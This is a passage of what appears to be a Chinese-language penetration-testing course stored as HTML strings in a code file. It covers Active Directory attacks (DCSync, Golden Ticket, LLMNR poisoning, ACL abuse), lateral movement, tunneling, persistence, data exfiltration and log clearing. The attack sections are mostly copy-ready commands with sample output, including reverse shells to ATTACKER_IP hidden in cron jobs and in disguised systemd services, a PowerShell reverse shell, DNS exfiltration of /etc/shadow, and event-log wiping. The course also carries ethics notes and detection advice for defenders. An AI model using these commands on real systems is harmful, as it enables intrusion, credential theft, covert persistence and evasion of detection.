shell</code></pre></div>\n\n<h3>DCSync：模拟域控制器</h3>\n\n<p>当你获得了足够高的权限（Domain Admin 或 Replicating Changes 权限），可以使用 DCSync 从域控复制所有用户的哈希——包括 krbtgt：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 mimikatz 执行 DCSync\nmimikatz # lsadump::dcsync /domain:targetcorp.local /all /csv\n\n[DC] 'targetcorp.local' will be the domain\n[DC] 'DC01.targetcorp.local' will be the DC\n[DC] Exporting domain 'targetcorp.local'\n\n500  Administrator       a]ad3b435b51404eeaad3b435b51404ee\n502  krbtgt              7]f5c6b8a9e2d1f0c4b5a6e7d8f9c0b1a2\n1001 jdoe                c4ca4238a0b923820dcc509a6f75849b\n1002 asmith              aad3b435b51404eeaad3b435b51404ee\n1003 mwilson             e99a18c428cb38d5f2608536789122e3\n1101 svc_sql             827ccb0eea8a706c4c34a16891f84e7b\n1102 svc_backup          d8578edf8458ce06fbc5bb76a58c5ca4\n\n# 关键目标：krbtgt 的哈希！\n# 有了它，我们可以伪造任何用户的 Kerberos 票据（Golden Ticket）\n\nmimikatz # kerberos::golden /domain:targetcorp.local \\\n  /sid:S-1-5-21-1234567890-2345678901-3456789012 \\\n  /krbtgt:7f5c6b8a9e2d1f0c4b5a6e7d8f9c0b1a2 \\\n  /user:Administrator \\\n  /id:500 /groups:512,513,518,519,520 \\\n  /ticket:golden_ticket.kirbi\n\nUser      : Administrator\nDomain    : targetcorp.local\nSID       : S-1-5-21-1234567890-2345678901-3456789012-500\nUserId    : 500\nGroups Id : *513 *512 *520 *518 *519\nTicket    : golden_ticket.kirbi\n\n# 注入 Golden Ticket\nmimikatz # kerberos::ptt golden_ticket.kirbi\n* Ticket successfully injected!\n\n# 现在你可以作为 Domain Admin 访问域内的任何资源\n$ impacket-psexec -k -no-pass targetcorp.local/Administrator@DC01\nC:\\Windows\\system32> whoami\ntargetcorp\\administrator</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">Golden Ticket 的危险性</div>\n<p>Golden Ticket 的有效期是 10 年（默认），并且即使你重置了目标用户的密码，Golden Ticket 仍然有效——因为它依赖于 krbtgt 的密钥。要彻底清除 Golden Ticket 的威胁，必须重置 krbtgt 账户的密码<strong>两次</strong>（因为 AD 会保留一个历史密钥）。</p>\n</div>\n\n<h2>LLMNR/NBT-NS 投毒：捕获网络中的凭证</h2>\n\n<p>在 Windows 网络中，当 DNS 查询失败时，系统会使用 LLMNR（Link-Local Multicast Name Resolution）和 NBT-NS（NetBIOS Name Service）作为备用名称解析协议。这两个协议<strong>不做身份验证</strong>，任何人都可以响应这些查询：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 Responder 监听 LLMNR/NBT-NS 请求\n$ responder -I eth0 -v\n\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n[*] [LLMNR] Listening on 224.0.0.252:5355\n[*] [NBT-NS] Listening on 0.0.0.0:137\n[*] [MDNS] Listening on 224.0.0.251:5353\n\n# 等待网络中有人输入错误的 UNC 路径（如 \\\\file-servr 而不是 \\\\file-server）\n[LLMNR] Request for 'file-servr' from 192.168.1.100\n[*] Responding to LLMNR query for 'file-servr'\n\n[+] Captured NTLMv2 hash:\njdoe::TARGETCORP:1122334455667788:a1b2c3d4e5f6...:010100000...\n\n# 保存哈希并用 hashcat 破解\n$ hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n\njdoe::TARGETCORP:...:P@ssw0rd123!</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">为什么 LLMNR 投毒如此有效</div>\n<p>在企业网络中，用户经常输入错误的 UNC 路径（如 <code>\\\\file-servr</code> 而不是 <code>\\\\file-server</code>）。当 DNS 无法解析时，Windows 会通过 LLMNR/NBT-NS 广播查询，攻击者的 Responder 会冒充目标服务器响应，获取用户的 NTLMv2 哈希。这个攻击在每一个企业内网测试中几乎都能成功，因为用户总会犯打字错误。</p>\n</div>\n\n<h2>ACL 滥用攻击</h2>\n\n<p>Active Directory 中的 ACL（访问控制列表）定义了谁对什么对象有什么权限。配置不当的 ACL 是域渗透的常见突破口：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 PowerView 枚举危险的 ACL\nPS C:\\> Import-Module .\\PowerView.ps1\nPS C:\\> Find-InterestingDomainAcl -ResolveGUIDs\n\nObjectDN           : CN=svc_backup,CN=Users,DC=targetcorp,DC=local\nActiveDirectoryRight : GenericAll\nIdentityReference  : TARGETCORP\\IT Admins\nAceType            : AccessAllowed\n\nObjectDN           : CN=Domain Admins,CN=Users,DC=targetcorp,DC=local\nActiveDirectoryRight : WriteDacl\nIdentityReference  : TARGETCORP\\asmith\nAceType            : AccessAllowed\n\n# 发现 asmith 对 Domain Admins 组有 WriteDacl 权限！\n# 这意味着 asmith 可以修改 Domain Admins 组的 ACL，把自己加进去\n\n# 利用 WriteDacl 将自己添加到 Domain Admins\nPS C:\\> Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" \\\n  -PrincipalIdentity asmith -Rights All\n\n# 或者直接修改目标用户的密码（如果有 GenericAll 权限）\nPS C:\\> Set-DomainUserPassword -Identity svc_backup -AccountPassword \\\n  (ConvertTo-SecureString \"NewP@ss123!\" -AsPlainText -Force)\n\n# 使用新密码以 svc_backup 身份登录\nPS C:\\> runas /user:TARGETCORP\\svc_backup cmd.exe</code></pre></div>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">常见危险 ACL 权限</div>\n<p><strong>GenericAll</strong>：对目标对象的完全控制权——可以修改密码、添加组成员、修改 ACL</p>\n<p><strong>WriteDacl</strong>：可以修改目标的 ACL，进而给自己赋予 GenericAll</p>\n<p><strong>WriteOwner</strong>：可以修改对象所有者，所有者可以修改 ACL</p>\n<p><strong>ForceChangePassword</strong>：可以强制重置任何用户的密码（不需要知道旧密码）</p>\n<p><strong>GenericWrite</strong>：可以修改对象的属性，包括 scriptPath（登录脚本）</p>\n</div>\n\n<h2>AD 攻击链完整流程</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">===== Active Directory 攻击链总览 =====\n\n[初始访问]\n  └── 钓鱼/漏洞利用 → 获得域内普通用户 shell\n\n[域枚举]\n  └── PowerView / SharpView → 了解域结构\n  └── BloodHound → 发现攻击路径\n\n[凭证获取]\n  ├── Kerberoasting → 破解服务账户密码\n  ├── AS-REP Roasting → 破解未启用 Pre-Auth 的用户\n  ├── LLMNR/NBT-NS 投毒 → 捕获 NTLM 挑战响应\n  └── Mimikatz → 提取内存中的凭证\n\n[权限提升]\n  ├── Pass-the-Hash → 利用 NTLM 哈希横向移动\n  ├── Token Impersonation → 模拟高权限用户令牌\n  └── ACL 滥用 → 利用错误配置的权限\n\n[域控制]\n  ├── DCSync → 复制所有域用户哈希\n  ├── Golden Ticket → 持久化的域管理员访问\n  └── Silver Ticket → 针对特定服务的伪造票据\n\n[最终目标]\n  └── 完全控制 Active Directory 域</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">防御视角：保护 Active Directory</div>\n<p>AD 防御是一个巨大的话题，但以下措施可以显著提高安全性：</p>\n<ul>\n<li><strong>最小权限原则</strong>：不要给普通用户不必要的 ACL 权限（GenericAll/WriteDacl 等）</li>\n<li><strong>服务账户加固</strong>：使用长且复杂的密码（25+字符），启用 AES 加密替代 RC4</li>\n<li><strong>Protected Users 组</strong>：将管理员加入此组，禁止 NTLM 认证和凭证缓存</li>\n<li><strong>限制 DCSync 权限</strong>：只有真正的域控才应该有 Replicating Changes 权限</li>\n<li><strong>LAPS</strong>：每台机器使用随机化的本地管理员密码</li>\n<li><strong>Tier 模型</strong>：将管理员分为 Tier 0（域控）/Tier 1（服务器）/Tier 2（工作站），禁止跨 Tier 登录</li>\n<li><strong>监控 BloodHound 采集</strong>：SharpHound 的大量 LDAP 查询可以被检测到</li>\n<li><strong>定期重置 krbtgt</strong>：每 180 天重置一次 krbtgt 密码（需重置两次）</li>\n</ul>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>本节小结</h2>\n\n<p>Active Directory 攻击链是企业渗透测试的核心。我们学习了：</p>\n\n<ol>\n<li><strong>域枚举</strong>：使用 PowerShell 和 BloodHound 了解域结构、发现攻击路径</li>\n<li><strong>Kerberos 攻击</strong>：Kerberoasting 和 AS-REP Roasting 获取服务账户凭证</li>\n<li><strong>凭证传递</strong>：Pass-the-Hash 和 DCSync 在不需明文密码的情况下横向移动</li>\n<li><strong>黄金票据</strong>：利用 krbtgt 哈希伪造持久化的域管理员访问权限</li>\n</ol>\n\n<p>下一节，我们将学习后渗透的最后两块拼图——横向移动和持久化，完成从\"攻入\"到\"扎根\"的全过程。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>";
+
+SECTION_CONTENT["pentest-05-01"] = "<h1>横向移动与持久化：后渗透的终极艺术</h1>\n\n<p>你已经突破了一台机器，提升了权限，甚至拿到了域管理员的凭证。看起来任务完成了？</p>\n\n<p>不，这才是真正挑战的开始。</p>\n\n<p>在真实的渗透测试中，客户不会只关心你能不能拿到一台机器的 root——他们想知道：<strong>攻击者能在我们的网络里走多远？能持续待多久？能偷走什么？</strong></p>\n\n<p>后渗透（Post-Exploitation）就是回答这些问题的阶段。它包含三个核心目标：</p>\n\n<ol>\n<li><strong>横向移动</strong>（Lateral Movement）：从一台机器跳到另一台机器</li>\n<li><strong>持久化</strong>（Persistence）：即使系统重启或密码更改，仍能保持访问</li>\n<li><strong>数据收集</strong>（Data Exfiltration）：找到并提取有价值的敏感数据</li>\n</ol>\n\n<h2>横向移动：在网络中自由穿行</h2>\n\n<h3>网络探测与资产发现</h3>\n\n<p>在跳板机上，第一步是发现内网中还有哪些有价值的目标：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 查看 ARP 缓存，发现同一子网的机器\nmeterpreter > arp\n\nARP cache\n=========\nIP address       MAC address        Interface\n----------       -----------        ---------\n192.168.1.1      00:50:56:c0:00:01  eth0\n192.168.1.10     00:50:56:a1:2b:3c  eth0\n192.168.1.20     00:50:56:a1:2b:4d  eth0\n192.168.1.50     00:50:56:a1:2b:5e  eth0\n192.168.1.100    00:50:56:a1:2b:6f  eth0\n192.168.1.200    00:50:56:a1:2b:7a  eth0\n\n# 使用端口扫描探测内网服务\nmeterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24\n\n[*] Performing ping sweep for IP range 192.168.1.0/24\n    [+] 192.168.1.10 is alive (DC01 - Domain Controller)\n    [+] 192.168.1.20 is alive (FILE-SERVER)\n    [+] 192.168.1.50 is alive (WEB-INTERNAL)\n    [+] 192.168.1.100 is alive (ADMIN-WS - Admin Workstation)\n    [+] 192.168.1.200 is alive (DB-SERVER)\n\n# 深入扫描特定主机的端口\nmeterpreter > run post/multi/gather/tcp_scanner RHOSTS=192.168.1.10 PORTS=53,88,135,139,389,445,636,3389\n\n[*] Scanning 192.168.1.10\n    [+] 192.168.1.10:53   - DNS (open)\n    [+] 192.168.1.10:88   - Kerberos (open)\n    [+] 192.168.1.10:135  - MSRPC (open)\n    [+] 192.168.1.10:389  - LDAP (open)\n    [+] 192.168.1.10:445  - SMB (open)\n    [+] 192.168.1.10:636  - LDAPS (open)\n    [+] 192.168.1.10:3389 - RDP (open)\n# 确认 192.168.1.10 是域控制器</code></pre></div>\n\n<h3>横向移动技术</h3>\n\n<h4>技术一：PsExec（经典中的经典）</h4>\n\n<p>PsExec 是 Sysinternals 工具集中的远程执行工具。微软自己出的工具，杀毒软件通常不会拦截：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 Impacket 的 psexec 进行横向移动\n$ impacket-psexec targetcorp.local/asmith@192.168.1.20 \\\n  -hashes :aad3b435b51404eeaad3b435b51404ee\n\nImpacket v0.11.0\n[*] Requesting shares on 192.168.1.20.....\n[*] Found writable share ADMIN$\n[*] Uploading file HfQrMkxv.exe\n[*] Opening SVCCTL on 192.168.1.20\n[*] Creating service HfQr on 192.168.1.20.....\n[*] Starting service HfQr.....\n\nMicrosoft Windows [Version 10.0.17763.4737]\nC:\\Windows\\system32>whoami\ntargetcorp\\asmith\nC:\\Windows\\system32>hostname\nFILE-SERVER</code></pre></div>\n\n<h4>技术二：WMI（Windows Management Instrumentation）</h4>\n\n<p>WMI 是 Windows 内置的管理框架，可以远程执行命令，而且<strong>不需要在目标上创建服务</strong>，比 PsExec 更隐蔽：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 使用 WMI 远程执行命令\nC:\\>wmic /node:192.168.1.20 /user:targetcorp\\asmith \\\n  /password:Aad3b435b51404ee \\\n  process call create \"cmd.exe /c whoami > C:\\temp\\output.txt\"\n\n# 使用 PowerShell + WMI 远程执行\n$cred = New-Object System.Management.Automation.PSCredential(\n  \"targetcorp\\asmith\",\n  (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force)\n)\nInvoke-WmiMethod -ComputerName 192.168.1.20 -Class Win32_Process \\\n  -Name Create -ArgumentList \"powershell.exe -enc <base64_payload>\" \\\n  -Credential $cred\n\n# 使用 Impacket 的 wmiexec（更隐蔽的选择）\n$ impacket-wmiexec targetcorp.local/asmith@192.168.1.20 \\\n  -hashes :aad3b435b51404eeaad3b435b51404ee\n\nImpacket v0.11.0\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Debug mode\nC:\\>whoami\ntargetcorp\\asmith</code></pre></div>\n\n<h4>技术三：SSH 横向移动（Linux 环境）</h4>\n\n<p>在内网 Linux 机器之间，SSH 是最常用的横向移动方式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用找到的凭证 SSH 到其他机器\n$ ssh alice@192.168.1.50\nalice@192.168.1.50's password: WpSup3r$ecure#2023\n\n$ whoami\nalice@web-internal\n\n# 使用 SSH 密钥横向移动（如果找到了私钥）\n$ cat /home/alice/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...（私钥内容）\n-----END RSA PRIVATE KEY-----\n\n$ chmod 600 /tmp/alice_key\n$ ssh -i /tmp/alice_key alice@192.168.1.200\n# 无需密码直接登录！\n\n# 使用 SSH Agent 转发劫持\n# 如果 alice 当前有活跃的 SSH agent\n$ export SSH_AUTH_SOCK=/tmp/ssh-agent.sock\n$ ssh-add -l\n2048 SHA256:abc... alice@targetcorp (RSA)\n# 现在可以使用 alice 的 SSH agent 中的密钥访问其他机器</code></pre></div>\n\n<h4>技术四：RDP 劫持</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 在 SYSTEM 权限下，可以劫持任何 RDP 会话而不需要密码\nC:\\>query user\n\nUSERNAME       SESSIONNAME   ID   STATE   IDLE TIME\n>administrator rdp-tcp#0      2   Active\n jdoe          rdp-tcp#1      3   Disc    15\n\n# 使用 tscon 劫持管理员的 RDP 会话\nC:\\>tscon 2 /dest:console\n\n# 现在你的屏幕上显示的是管理员的桌面！\n# 无需知道管理员的密码</code></pre></div>\n\n<h3>内网代理与隧道</h3>\n\n<p>有时候你需要从攻击机直接访问内网服务（比如 Web 管理界面），但防火墙阻止了直连。这时候需要建立隧道：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法一：SSH 动态端口转发（SOCKS 代理）\n$ ssh -D 1080 -N -f alice@192.168.1.50\n# 现在本地的 1080 端口是一个 SOCKS 代理\n# 配置浏览器使用 SOCKS5 代理 127.0.0.1:1080\n# 就可以通过跳板机浏览内网 Web 服务\n\n# 方法二：Meterpreter 端口转发\nmeterpreter > portfwd add -l 8888 -r 192.168.1.100 -p 3389\n[*] Local TCP relay created: 0.0.0.0:8888 <-> 192.168.1.100:3389\n\n# 现在可以通过本地 8888 端口 RDP 到内网的 192.168.1.100\n$ xfreerdp /v:127.0.0.1:8888 /u:administrator /p:P@ssw0rd\n\n# 方法三：使用 chisel 建立反向隧道\n# 在攻击机上启动 chisel 服务器\n$ ./chisel server --reverse --port 9001\n\n# 在跳板机上启动 chisel 客户端\nmeterpreter > upload /opt/chisel/chisel\nmeterpreter > execute -f \"./chisel\" -a \"client ATTACKER_IP:9001 R:socks\"\n\n# 方法四：proxychains 配置\n$ cat /etc/proxychains4.conf\n[ProxyList]\nsocks5 127.0.0.1 1080\n\n# 通过代理使用 nmap 扫描内网\n$ proxychains nmap -sT -Pn 192.168.1.0/24</code></pre></div>\n\n<h2>持久化：扎根的艺术</h2>\n\n<p>渗透测试中，你可能需要多次回到目标系统。如果每次都要重新利用漏洞，效率太低且风险太高。持久化确保你在失去访问后能够快速回来。</p>\n\n<div class=\"callout default\">\n<div class=\"callout-title\">职业道德提醒</div>\n<p>在授权的渗透测试中，所有持久化机制都必须在报告结束后<strong>完全清除</strong>。留下后门不仅是违法行为，也违背了渗透测试的职业道德。在报告中标注每个持久化机制的位置，方便客户清除。</p>\n</div>\n\n<h3>Linux 持久化</h3>\n\n<h4>SSH 后门</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法一：添加 SSH 公钥（最简单）\n# 生成密钥对（在攻击机上）\n$ ssh-keygen -t rsa -b 4096 -f /root/.ssh/backdoor_key -N \"\"\n\n# 将公钥写入目标的 authorized_keys\n$ cat /root/.ssh/backdoor_key.pub\nssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... attacker@kali\n\nmeterpreter > mkdir /root/.ssh\nmeterpreter > write /root/.ssh/authorized_keys \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB... attacker@kali\"\n\n# 以后随时可以用密钥登录\n$ ssh -i /root/.ssh/backdoor_key root@203.0.113.50\n\n# 方法二：SSH 配置后门\n# 修改 sshd_config 添加后门\n$ echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config\n$ echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config\n# 替换 authorized_keys 文件\n$ echo \"ssh-rsa AAAA... attacker\" >> /home/*/.ssh/authorized_keys\n$ systemctl restart sshd</code></pre></div>\n\n<h4>Cron Job 后门</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 添加一个定时回连的 cron job\n# 每 30 分钟尝试连接回攻击机\n$ (crontab -l 2>/dev/null; echo \"*/30 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\") | crontab -\n\n# 更隐蔽的方式：使用 DNS 隧道回连（不容易被防火墙拦截）\n$ (crontab -l 2>/dev/null; echo \"*/15 * * * * /usr/bin/dig @ATTACKER_DNS callback.targetcorp.local TXT +short | bash\") | crontab -\n\n# 在 /etc/cron.d/ 中创建系统级定时任务（需要 root）\n$ echo \"*/30 * * * * root /usr/local/bin/.health-check.sh\" > /etc/cron.d/system-health\n$ echo '#!/bin/bash' > /usr/local/bin/.health-check.sh\n$ echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /usr/local/bin/.health-check.sh\n$ chmod +x /usr/local/bin/.health-check.sh</code></pre></div>\n\n<h4>Systemd 服务后门</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 创建一个看起来像系统服务的后门\n$ cat > /etc/systemd/system/systemd-journal-flush.service.d/override.conf << 'EOF'\n[Service]\nExecStartPre=/usr/local/lib/systemd/journal-sync.sh\nEOF\n\n$ cat > /usr/local/lib/systemd/journal-sync.sh << 'SCRIPT'\n#!/bin/bash\nnohup bash -c 'while true; do bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 3600; done' &\nSCRIPT\n$ chmod +x /usr/local/lib/systemd/journal-sync.sh\n\n# 创建一个独立的恶意 systemd 服务\n$ cat > /etc/systemd/system/dbus-org.freedesktop.resolved.service << 'EOF'\n[Unit]\nDescription=Network Name Resolution Compat\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"\nRestart=always\nRestartSec=300\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\n$ systemctl daemon-reload\n$ systemctl enable dbus-org.freedesktop.resolved.service</code></pre></div>\n\n<h3>Windows 持久化</h3>\n\n<h4>服务持久化</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 创建一个伪装成系统服务持久化后门\nC:\\Windows\\system32> sc create \"WindowsUpdateAgent\" ^\n  binPath= \"C:\\Windows\\Temp\\wua_service.exe\" ^\n  start= auto ^\n  DisplayName= \"Windows Update Agent Service\" ^\n  Description= \"Keeps your PC up to date with the latest fixes.\"\n\n[SC] CreateService SUCCESS\n\nC:\\Windows\\system32> sc start WindowsUpdateAgent\n\n# 使用注册表创建 Run Key 持久化\nC:\\Windows\\system32> reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" ^\n  /v \"SecurityHealthSystray\" ^\n  /t REG_SZ ^\n  /d \"C:\\Users\\Public\\security_health.exe\" /f\n\nThe operation completed successfully.</code></pre></div>\n\n<h4>Scheduled Task 持久化</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-cmd\"># 创建计划任务：每天凌晨 3 点回连\nC:\\> schtasks /create /tn \"Microsoft\\Windows\\DiskDiagnostic\\Resolver\" ^\n  /tr \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\resolver.ps1\" ^\n  /sc daily /st 03:00 /ru SYSTEM\n\nSUCCESS: The scheduled task \"Resolver\" has successfully been created.\n\n# resolver.ps1 内容（反向 shell）\n$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\", 4444)\n$stream = $client.GetStream()\n[byte[]]$bytes = 0..65535|%{0}\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)\n    $sendback = (iex $data 2>&1 | Out-String )\n    $sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \"\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)\n    $stream.Write($sendbyte,0,$sendbyte.Length)\n    $stream.Flush()\n}\n$client.Close()</code></pre></div>\n\n<h4>WMI 持久化（高级）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-powershell\"># WMI 事件订阅持久化 - 非常隐蔽\n# 当用户登录时触发 Payload 执行\n\n# 创建事件过滤器\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = \"SystemHealthMonitor\"\n    EventNamespace = \"root\\cimv2\"\n    QueryLanguage = \"WQL\"\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2\"\n}\n\n# 创建事件消费者\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = \"SystemHealthConsumer\"\n    CommandLineTemplate = \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <base64_payload>\"\n}\n\n# 绑定过滤器和消费者\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n    Filter = $filter\n    Consumer = $consumer\n}\n\n# 清除 WMI 持久化（防御时使用）\nGet-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {$_.Name -eq \"SystemHealthMonitor\"} | Remove-WmiObject\nGet-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq \"SystemHealthConsumer\"} | Remove-WmiObject</code></pre></div>\n\n<h2>数据收集与外传</h2>\n\n<h3>敏感数据发现</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在 Windows 文件服务器上搜索敏感文件\nmeterpreter > search -f \"*.xlsx\" -d \\\\\\\\file-server\\\\shares\\\\\nFound 47 results...\n    \\\\\\\\file-server\\\\shares\\\\Finance\\\\budget_2024.xlsx (245KB)\n    \\\\\\\\file-server\\\\shares\\\\HR\\\\employee_salaries.xlsx (189KB)\n    \\\\\\\\file-server\\\\shares\\\\IT\\\\network_topology.xlsx (56KB)\n    \\\\\\\\file-server\\\\shares\\\\Legal\\\\contracts.xlsx (1.2MB)\n\n# 搜索包含关键字的文件\nmeterpreter > run post/windows/gather/enum_files SEARCH_FROM=C:\\Users EXTENSIONS=txt,doc,docx,pdf,xlsx KEYWORDS=password,credential,confidential,vpn\n\n# 在 Linux 上搜索敏感信息\n$ find / -name \"*.pem\" -o -name \"*.key\" -o -name \"id_rsa\" 2>/dev/null\n/root/.ssh/id_rsa\n/etc/ssl/private/server.key.pem\n/opt/app/config/database.yml  # 可能包含数据库凭证\n\n# 检查 bash_history 中的敏感操作\n$ cat /home/*/.bash_history | grep -i \"password\\|passwd\\|mysql\\|ssh\"\nmysql -u root -pS3cur3P@ss!\nssh alice@192.168.1.200\ncurl -u admin:admin123 https://internal-api/status</code></pre></div>\n\n<h3>数据外传通道</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法一：通过 HTTP POST 外传（最隐蔽）\n$ curl -X POST https://ATTACKER_SERVER/upload \\\n  -F \"data=@/tmp/sensitive_data.tar.gz\"\n\n# 方法二：通过 DNS 隧道外传\n# 将数据编码为 DNS 查询\n$ cat /etc/shadow | base64 | xargs -I{} dig {}.exfil.attacker.com\n\n# 方法三：通过 ICMP 隧道\n# 使用 icmpsh 建立 ICMP 反向 shell\n$ python3 icmpsh_m.py ATTACKER_IP VICTIM_IP\n# 所有数据通过 ICMP Echo 请求/响应传输\n\n# 方法四：分块加密外传\n$ split -b 1M sensitive_file.tar.gz chunk_\n$ for f in chunk_*; do\n    openssl enc -aes-256-cbc -salt -in \"$f\" -out \"${f}.enc\" -pass pass:MyKey\n    curl -X POST https://ATTACKER_SERVER/data -d @\"${f}.enc\"\n  done</code></pre></div>\n\n<h2>清理痕迹</h2>\n\n<p>专业的渗透测试员（和高级攻击者）会在操作完成后清理痕迹，减少被检测的风险：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Linux 日志清理\n# 清除 bash 历史记录\n$ history -c\n$ rm -f ~/.bash_history\n\n# 清除特定日志条目（需要 root）\n$ sed -i '/ATTACKER_IP/d' /var/log/auth.log\n$ sed -i '/ATTACKER_IP/d' /var/log/syslog\n\n# 使用 utmpdump 修改登录记录\n$ utmpdump /var/log/wtmp > /tmp/wtmp.txt\n$ vim /tmp/wtmp.txt  # 删除相关条目\n$ utmpdump -r /tmp/wtmp.txt > /var/log/wtmp\n\n# Windows 日志清理\nC:\\> wevtutil cl Security\nC:\\> wevtutil cl System\nC:\\> wevtutil cl Application\n\n# 使用 mimikatz 清除事件日志\nmimikatz # event::drop\n* Droping Windows Event logs\n* Security .... OK\n* System ..... OK\n* Application  OK</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">渗透测试报告要求</div>\n<p>在授权的渗透测试中，你必须在报告中记录：</p>\n<ul>\n<li>所有创建的后门和持久化机制的<strong>精确位置</strong></li>\n<li>所有修改的系统配置和文件</li>\n<li>所有上传到目标系统的工具文件</li>\n<li>所有外传的敏感数据</li>\n<li>清理痕迹的建议步骤</li>\n</ul>\n<p>客户需要这些信息来确保测试后系统恢复到安全状态。</p>\n</div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">防御视角：检测与对抗后渗透</div>\n<p><strong>检测横向移动：</strong></p>\n<ul>\n<li>监控 445 端口（SMB）的异常流量</li>\n<li>检测 PsExec 服务创建事件（Event ID 7045）</li>\n<li>监控 WMI 远程调用（Event ID 5861）</li>\n<li>使用网络分段限制东西向流量</li>\n</ul>\n<p><strong>检测持久化：</strong></p>\n<ul>\n<li>审计 autoruns 和启动项（Sysinternals Autoruns）</li>\n<li>监控新服务创建和注册表修改</li>\n<li>检查 WMI 事件订阅</li>\n<li>使用文件完整性监控（FIM）</li>\n</ul>\n<p><strong>检测数据外传：</strong></p>\n<ul>\n<li>DLP（数据防泄漏）系统</li>\n<li>出站流量分析：检测异常的 DNS 查询量、ICMP 流量</li>\n<li>SSL/TLS 流量检查</li>\n<li>网络出口过滤：限制不必要的出站端口</li>\n</ul>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>完整的渗透测试报告</h2>\n\n<p>渗透测试的最后一步——也是最重要的一步——是编写报告。没有报告，渗透测试就没有价值：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">========== 渗透测试报告模板 ==========\n\n1. 执行摘要（面向管理层）\n   - 测试范围和时间\n   - 发现的关键风险（高/中/低数量）\n   - 业务影响评估\n   - 总体安全评分（1-10 分）\n\n2. 技术发现（面向技术团队）\n   - 每个漏洞的详细描述\n   - 复现步骤（含截图/视频）\n   - CVSS 评分\n   - 